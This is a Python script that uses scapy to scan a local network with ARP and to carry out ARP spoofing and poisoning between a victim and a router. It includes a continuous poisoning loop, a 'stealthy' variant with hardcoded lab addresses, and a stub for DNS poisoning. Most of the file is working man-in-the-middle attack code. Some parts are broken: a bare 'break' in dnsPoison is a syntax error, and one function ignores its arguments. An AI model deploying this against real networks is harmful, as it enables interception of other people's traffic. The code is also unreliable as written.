#! /usr/bin/env python

from scapy.all import *
import socket
import math


logger = logging.getLogger(__name__)
handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)


# Converts the byte formats that scapy returns to something we can read
def format_ip(bytes_network, bytes_netmask):
    network = scapy.utils.ltoa(bytes_network)
    netmask = 32 - int(round(math.log(0xFFFFFFFF - bytes_netmask, 2)))
    net = "%s/%s" % (network, netmask)
    if netmask < 16:
        logger.warn("netmask %s too big" % net)
        return None

    return net


# Scans a given scapy net for active devices with the scapy arping method.
# Needs an net and interface as inputs (e.g. scan("192.168.56.0/24", "enp0s3") could work)
# Returns a nested list with IP addresses and the default gateway marked with string Default
def scan(net, interface, timeout=5):
    logger.info("Using scapy arping with %s on %s" % (net, interface))

    found_ips = []
    try:
        ans, unans = scapy.all.arping(net, iface=interface, timeout=timeout, verbose=True)
        for s, r in ans:
            line = r.src + " " + r.psrc
            ms = [r.src, r.psrc]
            found_ips.append(ms)
            logger.info(line)
    except socket.error as e:
        raise

    return found_ips


# Method that grabs all the interfaces from the scapy config returns a list with strings
def get_interfaces():
    interfaces = []
    for network, netmask, _, interface, address in scapy.config.conf.route.routes:

        # Skip standard interfaces and invalid netmasks.
        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0' or netmask <= 0 or netmask == 0xFFFFFFFF:
            continue

        # Format the net/ip
        net = format_ip(network, netmask)
        if net:
            interfaces += [net + ", " + interface]

    return interfaces


def arpSpoof(victimIP, victimMAC, routerIP, routerMAC):
    # Gets the mac address of the attacker
    interface = scapy.all.get_working_if()
    attackerMAC = scapy.all.get_if_hwaddr(interface)

    # sends packets to the victim and server, performing ARP spoofing
    scapy.all.send(scapy.all.ARP(op=2, pdst = victimIP, psrc = routerIP, hwdst=victimMAC, hwsrc=attackerMAC))
    scapy.all.send(scapy.all.ARP(op=2, pdst = routerIP, psrc = victimIP, hwdst=routerMAC, hwsrc=attackerMAC))


def arpRestore(victimIP, victimMAC, routerIP, routerMAC):
    scapy.all.send(scapy.all.ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
    scapy.all.send(scapy.all.ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)


def arpSpoofStealth(victimIP, victimMAC, routerIP, routerMAC):
    interface = scapy.all.get_working_if()
    attackerMAC = scapy.all.get_if_hwaddr(interface)

    scapy.all.send(scapy.all.ARP(op=1, hwsrc=attackerMAC, psrc=routerIP, hwdst=victimMAC, pdst=victimIP))


def arpPoison(victimIP, victimMAC, routerIP, routerMAC):
    print("Spoofing network...")
    try:
        while 1:
            arpSpoof(victimIP, victimMAC, routerIP, routerMAC)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Restoring network...")
        arpRestore(victimIP, victimMAC, routerIP, routerMAC)


def arpPoisonStealthy(victimIP, victimMAC, routerIP, routerMAC):
    arpSpoof('192.168.56.101', '0:0:0:0:0:0', '192.168.56.1', '0a:00:27:00:00:13')
    arpSpoofStealth(victimIP, victimMAC, routerIP, routerMAC)


def dnsPoison():
    break